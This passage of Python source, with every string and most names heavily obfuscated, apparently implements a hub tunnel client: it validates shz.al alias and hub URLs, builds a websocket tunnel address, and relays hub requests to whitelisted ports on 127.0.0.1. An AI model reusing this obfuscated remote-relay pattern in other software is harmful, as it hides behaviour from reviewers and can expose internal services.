    if O0_var_1627.lower() != codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u5fc5\\u987b\\u4f7f\\u7528\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')
    if codecs.decode('\\u0040', 'unicode_escape') in O0_var_1628:
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u4e0d\\u5f97\\u5305\\u542b\\u0020\\u0075\\u0073\\u0065\\u0072\\u0069\\u006e\\u0066\\u006f', 'unicode_escape')
    if codecs.decode('\\u003a', 'unicode_escape') in O0_var_1628:
        O0_var_1630, O0_var_1631 = O0_var_1628.split(codecs.decode('\\u003a', 'unicode_escape'), 1)
        if O0_var_1630.lower() != _SHZAL_HUB_ALIAS_HOST or not re.fullmatch(codecs.decode('\\u005b\\u0030\\u002d\\u0039\\u005d\\u002b', 'unicode_escape'), O0_var_1631):
            return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u975e\\u6cd5', 'unicode_escape')
        if len(O0_var_1631) > 5 or int(O0_var_1631) != 443:
            return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u7aef\\u53e3\\u5fc5\\u987b\\u4e3a\\u0020\\u0034\\u0034\\u0033', 'unicode_escape')
    elif O0_var_1628.lower() != _SHZAL_HUB_ALIAS_HOST:
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u975e\\u6cd5', 'unicode_escape')
    if not O0_var_1629.startswith(codecs.decode('\\u002f\\u007e', 'unicode_escape')):
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u975e\\u6cd5', 'unicode_escape')
    O0_var_1632 = O0_var_1629[2:]
    if len(O0_var_1632) < 3:
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u540d\\u79f0\\u8fc7\\u77ed', 'unicode_escape')
    if not _SHZAL_HUB_ALIAS_NAME_RE.fullmatch(O0_var_1632):
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u540d\\u79f0\\u542b\\u975e\\u6cd5\\u5b57\\u7b26', 'unicode_escape')
    return None

def O0_fn_47(O0_var_1633):
    O0_var_1634 = (O0_var_1633 or codecs.decode('', 'unicode_escape')).strip()
    if not O0_var_1634:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4f53\\u4e3a\\u7a7a', 'unicode_escape'))
    if len(O0_var_1634) > 512:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u8d85\\u8fc7\\u0020\\u0035\\u0031\\u0032\\u0020\\u5b57\\u7b26', 'unicode_escape'))
    if not O0_var_1634.startswith((codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape'))):
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u5fc5\\u987b\\u4ee5\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u6216\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u5f00\\u5934', 'unicode_escape'))
    if codecs.decode('\\u005c', 'unicode_escape') in O0_var_1634 or any((O0_var_1635.isspace() or unicodedata.category(O0_var_1635) == codecs.decode('\\u0043\\u0063', 'unicode_escape') for O0_var_1635 in O0_var_1634)):
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u542b\\u7a7a\\u767d\\u6216\\u63a7\\u5236\\u5b57\\u7b26', 'unicode_escape'))
    try:
        O0_var_1636 = urlsplit(O0_var_1634)
        O0_var_1637 = O0_var_1636.hostname or codecs.decode('', 'unicode_escape')
        O0_var_1638 = O0_var_1636.port
    except ValueError as exc:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u975e\\u6cd5', 'unicode_escape')) from exc
    if O0_var_1636.scheme not in (codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')) or not O0_var_1637:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u7f3a\\u5c11\\u5408\\u6cd5\\u0020\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065\\u0020\\u6216\\u0020\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'))
    if O0_var_1636.username is not None or O0_var_1636.password is not None:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u4e0d\\u5f97\\u5305\\u542b\\u0020\\u0075\\u0073\\u0065\\u0072\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'))
    if codecs.decode('\\u003f', 'unicode_escape') in O0_var_1634 or codecs.decode('\\u0023', 'unicode_escape') in O0_var_1634:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u4e0d\\u5f97\\u5305\\u542b\\u0020\\u0071\\u0075\\u0065\\u0072\\u0079\\u0020\\u6216\\u0020\\u0066\\u0072\\u0061\\u0067\\u006d\\u0065\\u006e\\u0074', 'unicode_escape'))
    if O0_var_1636.netloc.endswith(codecs.decode('\\u003a', 'unicode_escape')):
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u7aef\\u53e3\\u4e3a\\u7a7a', 'unicode_escape'))
    if O0_var_1638 is not None and (not 1 <= O0_var_1638 <= 65535):
        raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u7aef\\u53e3\\u8d8a\\u754c', 'unicode_escape'))
    try:
        ipaddress.ip_address(O0_var_1637)
    except ValueError:
        if len(O0_var_1637) > 253 or not all((_HUB_HOST_LABEL_RE.fullmatch(O0_var_1639) for O0_var_1639 in O0_var_1637.split(codecs.decode('\\u002e', 'unicode_escape')))):
            raise ValueError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u54cd\\u5e94\\u4e2d\\u7684\\u0020\\u0048\\u0075\\u0062\\u0020\\u5730\\u5740\\u0020\\u0068\\u006f\\u0073\\u0074\\u0020\\u975e\\u6cd5', 'unicode_escape'))
    return O0_var_1634.rstrip(codecs.decode('\\u002f', 'unicode_escape'))

def _hub_alias_response_headers(headers):
    O0_var_1640 = {str(O0_var_1641).lower(): str(O0_var_1642) for O0_var_1641, O0_var_1642 in (headers or {}).items()}
    O0_var_1643 = O0_var_1640.get(codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).split(codecs.decode('\\u003b', 'unicode_escape'), 1)[0].strip().lower()
    O0_var_1644 = O0_var_1640.get(codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip().lower()
    if O0_var_1643 != codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0070\\u006c\\u0061\\u0069\\u006e', 'unicode_escape'):
        raise ConnectionError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u522b\\u540d\\u54cd\\u5e94\\u4e0d\\u662f\\u0020\\u0074\\u0065\\u0078\\u0074\\u002f\\u0070\\u006c\\u0061\\u0069\\u006e', 'unicode_escape'))
    if O0_var_1644 not in (codecs.decode('', 'unicode_escape'), codecs.decode('\\u0069\\u0064\\u0065\\u006e\\u0074\\u0069\\u0074\\u0079', 'unicode_escape')):
        raise ConnectionError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u522b\\u540d\\u54cd\\u5e94\\u4e0d\\u5f97\\u538b\\u7f29', 'unicode_escape'))

async def O0_fn_48(O0_var_1645, alias, request_fn=None):
    O0_var_1646 = O0_fn_46(alias)
    if O0_var_1646:
        raise ConnectionError(O0_var_1646)
    O0_var_1647 = {codecs.decode('\\u0041\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0070\\u006c\\u0061\\u0069\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('\\u0063\\u0075\\u0072\\u006c\\u002f\\u0038\\u002e\\u0035\\u002e\\u0030', 'unicode_escape'), codecs.decode('\\u0041\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0045\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u0064\\u0065\\u006e\\u0074\\u0069\\u0074\\u0079', 'unicode_escape')}
    try:
        if request_fn is not None:
            O0_var_1648, O0_var_1649, O0_var_1650 = await request_fn(O0_var_1645, codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape'), alias, O0_var_1647, None)
        else:
            async with O0_var_1645.get(alias, headers=O0_var_1647, allow_redirects=False, auto_decompress=False, timeout=aiohttp.ClientTimeout(total=15)) as response:
                O0_var_1648 = response.status
                O0_var_1649 = dict(response.headers)
                O0_var_1651 = []
                O0_var_1652 = 0
                while O0_var_1652 <= 4096:
                    O0_var_1653 = await response.content.read(4097 - O0_var_1652)
                    if not O0_var_1653:
                        break
                    O0_var_1651.append(O0_var_1653)
                    O0_var_1652 += len(O0_var_1653)
                    if O0_var_1652 > 4096:
                        raise ConnectionError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u522b\\u540d\\u54cd\\u5e94\\u8d85\\u8fc7\\u0020\\u0034\\u0030\\u0039\\u0036\\u0020\\u5b57\\u8282', 'unicode_escape'))
                O0_var_1650 = b''.join(O0_var_1651)
    except asyncio.CancelledError:
        raise
    except ConnectionError:
        raise
    except Exception as exc:
        raise ConnectionError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u522b\\u540d\\u89e3\\u6790\\u5931\\u8d25\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % str(exc)[:200]) from exc
    if O0_var_1648 != 200:
        raise ConnectionError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u522b\\u540d\\u89e3\\u6790\\u5931\\u8d25\\u003a\\u0020\\u0048\\u0054\\u0054\\u0050\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_1648)
    _hub_alias_response_headers(O0_var_1649)
    if len(O0_var_1650) > 4096:
        raise ConnectionError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u522b\\u540d\\u54cd\\u5e94\\u8d85\\u8fc7\\u0020\\u0034\\u0030\\u0039\\u0036\\u0020\\u5b57\\u8282', 'unicode_escape'))
    try:
        O0_var_1654 = O0_var_1650.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0073\\u0074\\u0072\\u0069\\u0063\\u0074', 'unicode_escape'))
    except UnicodeDecodeError as exc:
        raise ConnectionError(codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u522b\\u540d\\u54cd\\u5e94\\u4e0d\\u662f\\u5408\\u6cd5\\u0020\\u0055\\u0054\\u0046\\u002d\\u0038', 'unicode_escape')) from exc
    try:
        return O0_fn_47(O0_var_1654)
    except ValueError as exc:
        raise ConnectionError(str(exc)) from exc

def O0_fn_49(O0_var_1655):
    O0_var_1656 = (O0_var_1655 or codecs.decode('', 'unicode_escape')).strip().rstrip(codecs.decode('\\u002f', 'unicode_escape'))
    if O0_var_1656.startswith(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')):
        return codecs.decode('\\u0077\\u0073\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_1656[len(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')):] + codecs.decode('\\u002f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')
    if O0_var_1656.startswith(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f', 'unicode_escape')):
        return codecs.decode('\\u0077\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_1656[len(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f', 'unicode_escape')):] + codecs.decode('\\u002f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')
    return codecs.decode('\\u0077\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_1656 + codecs.decode('\\u002f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')

def O0_fn_50(headers):
    O0_var_1657 = {}
    for O0_var_1658, O0_var_1659 in (headers or {}).items():
        O0_var_1660 = str(O0_var_1658).lower()
        if O0_var_1660 in _HUB_HOP_HEADERS or O0_var_1660.startswith(codecs.decode('\\u0078\\u002d\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061\\u002d\\u0068\\u0075\\u0062\\u002d', 'unicode_escape')) or O0_var_1660.startswith(codecs.decode('\\u0078\\u002d\\u0066\\u006f\\u0072\\u0077\\u0061\\u0072\\u0064\\u0065\\u0064\\u002d', 'unicode_escape')):
            continue
        O0_var_1657[O0_var_1660] = O0_var_1659
    return O0_var_1657

class HubRegisterError(Exception):
    codecs.decode('\\u0068\\u0075\\u0062\\u0020\\u6ce8\\u518c\\u88ab\\u62d2\\u0020\\u0028\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u006e\\u0061\\u006d\\u0065\\u0020\\u002f\\u0020\\u006e\\u0061\\u006d\\u0065\\u005f\\u0074\\u0061\\u006b\\u0065\\u006e\\u0020\\u002f\\u0020\\u0066\\u0075\\u006c\\u006c\\u0020\\u002f\\u0020\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u0029', 'unicode_escape')

    def __init__(self, code, message):
        super().__init__(codecs.decode('\\u005b\\u0025\\u0073\\u005d\\u0020\\u0025\\u0073', 'unicode_escape') % (code, message))
        self.code = code
        self.message = message

class LoopbackRelayError(Exception):
    codecs.decode('\\u56de\\u73af\\u8f6c\\u53d1\\u5931\\u8d25\\u0020\\u0028\\u0030\\u002e\\u0036\\u002e\\u0037\\u003a\\u0020\\u0068\\u0075\\u0062\\u0020\\u0072\\u0065\\u0071\\u0020\\u5e27\\u4e0e\\u672c\\u5730\\u0020\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u0020\\u8def\\u7531\\u5171\\u7528\\u6838\\u5fc3\\u002c\\u0020\\u0064\\u006f\\u0063\\u0073\\u002f\\u0041\\u0050\\u0049\\u002e\\u004d\\u0044\\u0020\\u4e8c\\u5341\\u0029\\u000a\\u000a\\u0020\\u0020\\u0020\\u0020\\u0063\\u006f\\u0064\\u0065\\u0020\\u679a\\u4e3e\\u0020\\u0028\\u4e0e\\u0020\\u0068\\u0075\\u0062\\u0020\\u7aef\\u0020\\u0072\\u0065\\u006c\\u0061\\u0079\\u002e\\u0067\\u006f\\u0020\\u9519\\u8bef\\u6620\\u5c04\\u5bf9\\u9f50\\u0029\\u003a\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u0070\\u006f\\u0072\\u0074\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u006c\\u006c\\u006f\\u0077\\u0065\\u0064\\u003a\\u0020\\u004b\\u0048\\u0055\\u0042\\u005f\\u0050\\u004f\\u0052\\u0054\\u0053\\u0020\\u672a\\u653e\\u884c\\u0020\\u0028\\u62d2\\u7edd\\u65f6\\u4e0d\\u53d1\\u8d77\\u8fde\\u63a5\\u002c\\u0020\\u65e0\\u7aef\\u53e3\\u626b\\u63cf\\u4fa7\\u4fe1\\u9053\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u0062\\u006f\\u0064\\u0079\\u005f\\u0074\\u006f\\u006f\\u005f\\u006c\\u0061\\u0072\\u0067\\u0065\\u003a\\u0020\\u0020\\u0020\\u8bf7\\u6c42\\u002f\\u54cd\\u5e94\\u4f53\\u8d85\\u8fc7\\u0020\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0048\\u0055\\u0042\\u005f\\u004d\\u0041\\u0058\\u005f\\u0042\\u004f\\u0044\\u0059\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u006c\\u006f\\u006f\\u0070\\u0062\\u0061\\u0063\\u006b\\u005f\\u0075\\u006e\\u0072\\u0065\\u0061\\u0063\\u0068\\u0061\\u0062\\u006c\\u0065\\u003a\\u0020\\u56de\\u73af\\u8fde\\u63a5\\u5931\\u8d25\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, code, message):
        super().__init__(codecs.decode('\\u005b\\u0025\\u0073\\u005d\\u0020\\u0025\\u0073', 'unicode_escape') % (code, message))
        self.code = code
        self.message = message

def _loopback_relay_prepare(port, whitelist, method, path, query, headers, body, max_body, forwarded_for=None):
    if whitelist is not None and port not in whitelist:
        raise LoopbackRelayError(codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u006c\\u006c\\u006f\\u0077\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u7aef\\u53e3\\u0020\\u0025\\u0064\\u0020\\u672a\\u5728\\u53cd\\u4ee3\\u767d\\u540d\\u5355', 'unicode_escape') % port)
    if body is not None and len(body) > max_body:
        raise LoopbackRelayError(codecs.decode('\\u0062\\u006f\\u0064\\u0079\\u005f\\u0074\\u006f\\u006f\\u005f\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'), codecs.decode('\\u8bf7\\u6c42\\u4f53\\u8d85\\u8fc7\\u0020\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0048\\u0055\\u0042\\u005f\\u004d\\u0041\\u0058\\u005f\\u0042\\u004f\\u0044\\u0059\\u0020\\u0028\\u0025\\u0064\\u0020\\u5b57\\u8282\\u0029', 'unicode_escape') % max_body)
    O0_var_1661 = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0025\\u0064\\u0025\\u0073', 'unicode_escape') % (port, path)
    if query:
        O0_var_1661 += codecs.decode('\\u003f', 'unicode_escape') + query
    O0_var_1662 = O0_fn_50(headers)
    if forwarded_for:
        O0_var_1662[codecs.decode('\\u0078\\u002d\\u0066\\u006f\\u0072\\u0077\\u0061\\u0072\\u0064\\u0065\\u0064\\u002d\\u0066\\u006f\\u0072', 'unicode_escape')] = forwarded_for
    return (O0_var_1661, O0_var_1662)

async def O0_fn_51(O0_var_1663, *, port, whitelist, method, path, query, headers, body, relay_timeout, max_body, forwarded_for=None):
    O0_var_1664, O0_var_1665 = _loopback_relay_prepare(port, whitelist, method, path, query, headers, body, max_body, forwarded_for)
    try:
        O0_var_1666 = await O0_var_1663.request(method, O0_var_1664, data=body if body else None, headers=O0_var_1665, timeout=aiohttp.ClientTimeout(total=None, connect=10, sock_connect=10, sock_read=relay_timeout))
        return (O0_var_1666.status, dict(O0_var_1666.headers), O0_var_1666)
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        raise LoopbackRelayError(codecs.decode('\\u006c\\u006f\\u006f\\u0070\\u0062\\u0061\\u0063\\u006b\\u005f\\u0075\\u006e\\u0072\\u0065\\u0061\\u0063\\u0068\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'), str(exc)[:300])

async def O0_fn_52(O0_var_1667, *, port, whitelist, method, path, query, headers, body, relay_timeout, max_body, request_fn=None, forwarded_for=None):
    O0_var_1668, O0_var_1669 = _loopback_relay_prepare(port, whitelist, method, path, query, headers, body, max_body, forwarded_for)
    try:
        if request_fn is not None:
            O0_var_1670, O0_var_1671, O0_var_1672 = await request_fn(O0_var_1667, method, O0_var_1668, O0_var_1669, body)
        else:
            async with O0_var_1667.request(method, O0_var_1668, data=body if body else None, headers=O0_var_1669, timeout=aiohttp.ClientTimeout(total=relay_timeout)) as O0_var_1673:
                O0_var_1670 = O0_var_1673.status
                O0_var_1671 = dict(O0_var_1673.headers)
                O0_var_1672 = await O0_var_1673.read()
    except asyncio.CancelledError:
        raise
    except LoopbackRelayError:
        raise
    except Exception as exc:
        raise LoopbackRelayError(codecs.decode('\\u006c\\u006f\\u006f\\u0070\\u0062\\u0061\\u0063\\u006b\\u005f\\u0075\\u006e\\u0072\\u0065\\u0061\\u0063\\u0068\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'), str(exc)[:300])
    if len(O0_var_1672) > max_body:
        raise LoopbackRelayError(codecs.decode('\\u0062\\u006f\\u0064\\u0079\\u005f\\u0074\\u006f\\u006f\\u005f\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'), codecs.decode('\\u54cd\\u5e94\\u4f53\\u8d85\\u8fc7\\u0020\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0048\\u0055\\u0042\\u005f\\u004d\\u0041\\u0058\\u005f\\u0042\\u004f\\u0044\\u0059\\u0020\\u0028\\u0025\\u0064\\u0020\\u5b57\\u8282\\u0029', 'unicode_escape') % max_body)
    return (O0_var_1670, O0_var_1671, O0_var_1672)

class HubTunnelManager:
    codecs.decode('\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0033\\u0020\\u51fa\\u7ad9\\u96a7\\u9053\\u7ba1\\u7406\\u5668\\u0020\\u0028\\u7ed3\\u6784\\u955c\\u50cf\\u0020\\u0041\\u0072\\u0067\\u006f\\u0054\\u0075\\u006e\\u006e\\u0065\\u006c\\u004d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u0020\\u002f\\u0020\\u0030\\u002e\\u0036\\u002e\\u0034\\u0020\\u72b6\\u6001\\u60ef\\u4f8b\\u0029\\u000a\\u000a\\u0020\\u0020\\u0020\\u0020\\u6d4b\\u8bd5\\u6ce8\\u5165\\u7f1d\\u0020\\u0028\\u751f\\u4ea7\\u6052\\u0020\\u004e\\u006f\\u006e\\u0065\\u002c\\u0020\\u53c2\\u7167\\u0020\\u0043\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0051\\u0075\\u0069\\u0063\\u006b\\u0054\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u005f\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0065\\u0072\\u0020\\u6a21\\u5f0f\\u0029\\u003a\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u005f\\u0077\\u0073\\u005f\\u0066\\u0061\\u0063\\u0074\\u006f\\u0072\\u0079\\u0028\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u002c\\u0020\\u0075\\u0072\\u006c\\u0029\\u0020\\u2192\\u0020\\u0061\\u0073\\u0079\\u006e\\u0063\\u0020\\u0063\\u006f\\u006e\\u0074\\u0065\\u0078\\u0074\\u0020\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u0020\\u0028\\u751f\\u4ea7\\u0020\\u2192\\u0020\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u002e\\u0077\\u0073\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u005f\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0028\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u002c\\u0020\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u002c\\u0020\\u0075\\u0072\\u006c\\u002c\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073\\u002c\\u0020\\u0062\\u006f\\u0064\\u0079\\u0029\\u0020\\u2192\\u0020\\u0028\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u002c\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073\\u002c\\u0020\\u0062\\u006f\\u0064\\u0079\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, O0_var_1674, O0_var_1675, port, ports=None, source=codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074\\u0075\\u0070', 'unicode_escape')):
        self.hub_url = O0_fn_45(O0_var_1674)
        self.kname = (O0_var_1675 or codecs.decode('', 'unicode_escape')).strip().lower()
        self.port = int(port)
        self.ports = list(ports or [])
        self.source = source
        self.log = Logger
        O0_var_1676 = O0_fn_44(Config.KHUB_PUBLIC_URL)
        if O0_var_1676:
            self.log.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u004b\\u0048\\u0055\\u0042\\u005f\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u005f\\u0055\\u0052\\u004c\\u0020', 'unicode_escape') + str(O0_var_1676) + codecs.decode('\\u002c\\u0020\\u56de\\u9000\\u672c\\u8f6e\\u5b9e\\u9645\\u0020\\u0048\\u0075\\u0062\\u0020\\u57fa\\u5740\\u4e0a\\u62a5', 'unicode_escape'))
            self.public_url = None
        else:
            self.public_url = (Config.KHUB_PUBLIC_URL or codecs.decode('', 'unicode_escape')).strip().rstrip(codecs.decode('\\u002f', 'unicode_escape')) or None
        self.resolved_hub = None if O0_fn_1(self.hub_url) else self.hub_url
        self.relay_url = codecs.decode('\\u0025\\u0073\\u002f\\u0025\\u0073', 'unicode_escape') % (self.public_url or self.resolved_hub or self.hub_url, self.kname)
        self.status = codecs.decode('\\u0072\\u0065\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006e\\u0067', 'unicode_escape')
        self.last_error = None
        self.last_error_at = None
        self.consecutive_failures = 0
        self.last_connected_at = None
        self.relay_count = 0
        self._register_error = None
        self._count_lock = threading.Lock()
        self._ping_interval = max(5.0, float(Config.KISAMA_HUB_PING_INTERVAL))
        self._retry_base = max(0.5, float(Config.KISAMA_HUB_RETRY_BASE_SECONDS))
        self._retry_max = max(self._retry_base, float(Config.KISAMA_HUB_RETRY_MAX_SECONDS))
        self._relay_timeout = max(5.0, float(Config.KISAMA_HUB_RELAY_TIMEOUT))
        self._max_body = max(1, int(Config.KISAMA_HUB_MAX_BODY))
        self._ws_factory = None
        self._request = None
        self._stop = threading.Event()
        self._thread = None
        self._loop = None
        self._main_task = None
        self._ws_lock = asyncio.Lock()

    def snapshot(self):
        with self._count_lock:
            O0_var_1677 = self.relay_count
